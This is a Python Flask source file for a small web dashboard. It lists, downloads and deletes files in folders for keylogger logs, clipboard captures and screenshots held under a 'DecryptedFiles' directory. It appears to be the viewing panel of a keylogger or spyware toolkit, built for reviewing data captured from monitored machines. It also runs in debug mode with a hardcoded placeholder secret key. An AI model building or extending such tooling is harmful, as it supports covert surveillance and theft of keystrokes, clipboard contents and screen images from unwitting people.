from flask import Flask, render_template, send_from_directory, request, redirect, url_for, flash
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Replace with a real secret key

# Base directory for files
BASE_UPLOAD_FOLDER = 'DecryptedFiles'
KEYLOGGER_FOLDER = os.path.join(BASE_UPLOAD_FOLDER, 'keylogger')
CLIPBOARD_FOLDER = os.path.join(BASE_UPLOAD_FOLDER, 'clipboard')
SCREENSHOT_FOLDER = os.path.join(BASE_UPLOAD_FOLDER, 'screenshot')

# Helper function to list files in a directory
def list_files(directory):
    return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

@app.route('/')
def index():
    keylogger_files = list_files(KEYLOGGER_FOLDER)
    clipboard_files = list_files(CLIPBOARD_FOLDER)
    screenshot_files = list_files(SCREENSHOT_FOLDER)
    return render_template(
        'index.html',
        keylogger_files=keylogger_files,
        clipboard_files=clipboard_files,
        screenshot_files=screenshot_files
    )

@app.route('/download/<category>/<filename>')
def download_file(category, filename):
    folder = {
        'keylogger': KEYLOGGER_FOLDER,
        'clipboard': CLIPBOARD_FOLDER,
        'screenshot': SCREENSHOT_FOLDER
    }.get(category)

    if folder:
        return send_from_directory(folder, filename, as_attachment=True)
    return "Category not found", 404

@app.route('/delete/<category>/<filename>', methods=['POST'])
def delete_file(category, filename):
    folder = {
        'keylogger': KEYLOGGER_FOLDER,
        'clipboard': CLIPBOARD_FOLDER,
        'screenshot': SCREENSHOT_FOLDER
    }.get(category)

    if folder:
        file_path = os.path.join(folder, filename)
        if os.path.exists(file_path):
            os.remove(file_path)
            flash(f'File {filename} deleted successfully from {category}.', 'success')
        else:
            flash(f'File {filename} not found in {category}.', 'error')
    else:
        flash(f'Category {category} not found.', 'error')

    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
